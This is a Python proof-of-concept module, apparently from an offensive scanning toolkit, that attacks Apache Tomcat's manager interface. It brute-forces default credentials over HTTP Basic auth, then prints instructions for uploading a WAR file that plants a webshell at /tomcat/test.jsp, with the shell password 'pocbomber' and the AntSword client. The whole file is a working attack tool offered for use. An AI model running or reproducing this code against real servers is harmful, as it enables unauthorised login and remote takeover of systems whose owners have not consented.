import requests
import urllib, re
import base64

def verify(url):
    relsult = {
        'name': 'Tomcat 弱口令(上传war包getshell)',
        'vulnerable': False,
        'attack': True,
    }
    tomcat_users = ['tomcat', 'admin']
    tomcat_passwds = ['tomcat', 'admin', '123456', '']
    try:
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
            'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
            'Accept-Encoding': 'gzip, deflate',
            'Authorization': '',
        }
        vurl = urllib.parse.urljoin(url, '/manager/html')
        rep = requests.get(vurl, timeout=3)
        if re.search('tomcat', rep.text) and 'Apache' in str(rep.headers) and rep.status_code == 401:
            for tomcat_user in tomcat_users:
                for tomcat_passwd in tomcat_passwds:
                    auth = '{0}:{1}'.format(tomcat_user, tomcat_passwd)
                    base64_auth = base64.b64encode(auth.encode('utf-8')).decode('utf-8')
                    headers['Authorization'] = 'Basic {0}'.format(base64_auth)
                    verify_rep = requests.get(vurl, headers=headers, timeout=2)
                    if verify_rep.status_code == 200 and 'Set-Cookie' in str(verify_rep.headers):
                        relsult['vulnerable'] = True
                        relsult['url'] = url
                        relsult['vurl'] = vurl
                        relsult['user'] = tomcat_user
                        relsult['password'] = tomcat_passwd
                        relsult['about'] = 'https://www.cnblogs.com/-chenxs/p/11647246.html'
                        return relsult
        return relsult
    except:
        return relsult


def attack(url):
    try:
        session = requests.Session()
        tomcat_user = input('[+] 输入tomcat用户名:')
        tomcat_passwd = input('[+] 输入tomcat密码:')
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
            'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
            'Accept-Encoding': 'gzip, deflate',
            'Authorization': '',
        }
        auth = '{0}:{1}'.format(tomcat_user, tomcat_passwd)
        base64_auth = base64.b64encode(auth.encode('utf-8')).decode('utf-8')
        headers['Authorization'] = 'Basic {0}'.format(base64_auth)
        vurl = urllib.parse.urljoin(url, '/manager/html')
        verify_rep = session.get(vurl, headers=headers, timeout=3)
        if verify_rep.status_code == 200 and 'Set-Cookie' in str(verify_rep.headers):
            print('[+] tomcat登录成功!')
            print('[+] 获取到: {0}'.format(verify_rep.headers['Set-Cookie']))
            print('[+] tomcat后台getshell步骤')
            print('-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=-=')
            print('|    1.在后台将文件 /pocs/middleware/tomcat/tomcat.war 上传            |')
            print('|    2.上传成功后在 根目录下的 /tomcat/test.jsp 可以访问到webshell!       |')
            print('-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=-=')
            print('[+] 注意: 在将war包上传后访问')
            print('[*] webshell地址(蚁剑): {0}'.format(urllib.parse.urljoin(url, '/tomcat/test.jsp')))
            print('[*] 密码: pocbomber')
            return True
        return False
    except:
        return False


